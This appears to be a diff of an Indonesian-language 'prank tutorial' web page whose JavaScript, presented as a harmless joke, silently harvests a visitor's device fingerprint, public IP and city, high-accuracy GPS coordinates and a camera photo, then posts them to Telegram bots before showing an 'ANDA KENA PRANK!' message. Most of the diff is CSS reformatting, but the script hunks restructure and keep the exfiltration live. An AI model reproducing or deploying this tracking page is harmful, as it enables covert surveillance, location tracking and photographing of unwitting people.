@@ -5,7 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Tutorial Prank temen yang dongo 100% dijamin berhasil</title>
   <style>
-    * { box-sizing: border-box; }
+    * {
+      box-sizing: border-box;
+    }
     body {
       background-color: #000;
       color: #00ff00;
@@ -18,6 +20,7 @@
       overflow: hidden;
       flex-direction: column;
     }
+
     #msg {
       white-space: pre-wrap;
       font-size: 14px;
@@ -28,23 +31,35 @@
       padding-left: 15px;
       animation: cursor 1s step-end infinite;
     }
+
     @keyframes cursor {
-      50% { border-color: transparent; }
+      50% {
+        border-color: transparent;
+      }
     }
+
     .prank {
       font-size: 40px;
       color: #0f0;
-      text-shadow: 0 0 5px #0f0, 0 0 10px #0f0, 0 0 20px #00ff00, 0 0 40px #00ff00;
+      text-shadow:
+        0 0 5px #0f0,
+        0 0 10px #0f0,
+        0 0 20px #00ff00,
+        0 0 40px #00ff00;
       font-weight: bold;
       opacity: 0;
       animation: muncul 2s ease-in-out forwards;
     }
+
     @keyframes muncul {
       0% { opacity: 0; transform: scale(0.8); }
       50% { opacity: 1; transform: scale(1.1); }
       100% { transform: scale(1); }
     }
-    .hidden { display: none; }
+
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -76,6 +91,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
+
       await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -123,26 +139,26 @@
 - 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 -
 
 Jenis Perangkat        : ${brand}
-User Agent             : ${ua}
-Platform               : ${platform}
-Vendor Browser         : ${vendor}
-GPU Vendor             : ${gpu.vendor}
-GPU Renderer           : ${gpu.renderer}
-CPU                    : ${navigator.hardwareConcurrency || '-'} inti
-RAM                    : ${navigator.deviceMemory || '-'} GB
-Resolusi Layar         : ${screen.width} x ${screen.height}
-Orientasi Layar        : ${screen.orientation?.type || '-'}
-Touch Support          : ${touch} (${navigator.maxTouchPoints} titik)
-Kerapatan Piksel       : ${window.devicePixelRatio}
-Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-JavaScript             : Aktif
-Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
-HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
-Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Waktu Lokal            : ${waktu}
-Referrer               : ${ref}
-Baterai                : ${Math.round(bat.level * 100)}%
-Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
+User Agent          : ${ua}
+Platform            : ${platform}
+Vendor Browser      : ${vendor}
+GPU Vendor          : ${gpu.vendor}
+GPU Renderer        : ${gpu.renderer}
+CPU                 : ${navigator.hardwareConcurrency || '-'} inti
+RAM                 : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar      : ${screen.width} x ${screen.height}
+Orientasi Layar     : ${screen.orientation?.type || '-'}
+Touch Support       : ${touch} (${navigator.maxTouchPoints} titik)
+Kerapatan Piksel    : ${window.devicePixelRatio}
+Cookies Aktif       : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+JavaScript          : Aktif
+Do Not Track        : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
+HTTPS               : ${location.protocol === "https:" ? "Ya" : "Tidak"}
+Zona Waktu          : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Waktu Lokal         : ${waktu}
+Referrer            : ${ref}
+Baterai             : ${Math.round(bat.level * 100)}%
+Sedang Mengisi      : ${bat.charging ? '✅' : '🚫'}
 `.trim();
     };
 
@@ -153,11 +169,11 @@ Sedang Mengisi         : ${bat.charging ? '✅' : '🚫'}
         return `
 - 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 -
 
-IP Publik              : ${ip.ip}
-Penyedia Layanan       : ${ip.org}
-Negara                 : ${ip.country_name}
-Provinsi               : ${ip.region}
-Kota                   : ${ip.city}
+IP Publik           : ${ip.ip}
+Penyedia Layanan    : ${ip.org}
+Negara              : ${ip.country_name}
+Provinsi            : ${ip.region}
+Kota                : ${ip.city}
 `.trim();
       } catch {
         return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
@@ -168,21 +184,20 @@ Kota                   : ${ip.city}
       return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude, accuracy } = pos.coords;
-          resolve({
-            teks: `
+          resolve(`
 - 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
-Latitude               : ${latitude}
-Longitude              : ${longitude}
-Akurasi                : ±${accuracy} meter
-Peta                   : https://maps.google.com/?q=${latitude},${longitude}
-`, aktif: true });
+Latitude            : ${latitude}
+Longitude           : ${longitude}
+Akurasi             : ±${accuracy} meter
+Peta                : https://maps.google.com/?q=${latitude},${longitude}
+`);
         }, () => {
-          resolve({ teks: `
+          resolve(`
 - 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
 ❌ Lokasi tidak diizinkan oleh pengguna.
-`, aktif: false });
+`);
         }, { enableHighAccuracy: true, timeout: 10000 });
       });
     };
@@ -203,13 +218,14 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}
         stream.getTracks().forEach(track => track.stop());
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-        return { blob, aktif: true };
+        await kirimFoto(blob);
+        return "";
       } catch {
-        return { blob: null, aktif: false, teks: `
+        return `
 - 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
 ❌ Kamera tidak diizinkan oleh pengguna.
-` };
+`;
       }
     };
 
@@ -217,23 +233,16 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
-
-      const infoGabungan = `${info}\n\n${ip}\n\n${lokasi.teks}`;
-      await kirimPesan(infoGabungan);
-
       const kamera = await ambilKamera();
-      if (kamera.aktif && kamera.blob) {
-        await kirimFoto(kamera.blob);
-      }
 
+      const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
       document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
+      await kirimPesan(final);
+
+      // Efek akhir prank muncul
       setTimeout(() => {
         document.getElementById("msg").classList.add("hidden");
-        const div = document.createElement("div");
-        div.id = "prank";
-        div.className = "prank";
-        div.textContent = "ANDA KENA PRANK!";
-        document.body.appendChild(div);
+        document.getElementById("prank").classList.remove("hidden");
       }, 1500);
     };
 
